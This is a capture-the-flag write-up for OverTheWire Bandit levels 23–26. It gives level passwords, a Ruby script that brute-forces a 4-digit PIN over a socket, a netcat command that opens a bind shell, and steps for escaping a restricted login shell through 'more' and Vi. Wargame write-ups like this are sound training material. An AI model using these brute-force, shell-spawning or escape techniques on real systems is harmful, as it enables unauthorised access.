# OverTheWire - Bandit

Writeup by Brendan Weibrecht

## 23 -> 24



UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

## 24 -> 25

/tmp/ZimbiX_24-25.rb:

```ruby
    #!/usr/bin/env ruby

    require 'socket'

    s = TCPSocket.new 'localhost', 30002

    (0..9999).each do |i|
      x = i.to_s.rjust 4, '0'
      msg = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ #{x}"
      puts msg
      s.puts msg
      puts s.gets
    end
```

    The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

## 25 -> 26

Using the SSH key to log in to bandit26 kicks us out after showing some banner text.

`cat /etc/passwd` from bandit25 shows the shell is `/usr/bin/showtext`.

    bandit25@melinda:~$ cat /usr/bin/showtext
    #!/bin/sh

    more ~/text.txt
    exit 0

So it uses `more`.

Making the terminal 4 chars tall pauses in `more`.
Help shows you can execute a command in a subshell. This doesn't seem to wait or output.

`!nc -l -p 13376 -e /bin/bash`

Using the option to enter Vi, Vi shows you can do commands from there too. It looks like these don't work as they use the shell defined in $SHELL, which is the `showtext` binary.

Trying to set Vi's shell: `:set shell=/bin/bash` then running `:!/bin/bash`... works!

So steps are:

- Set up SSH key (save as `bandit26_rsa`, `chmod 600`)
- Make terminal 6 characters tall
- SSH (as bandit26 with key: `ssh -i bandit26_rsa bandit26@bandit.labs.overthewire.org`)
- Expand the terminal again (once it says "More" at the bottom)
- Press V to enter Vi
- Run `:set shell=/bin/bash`
- Run `:!/bin/bash`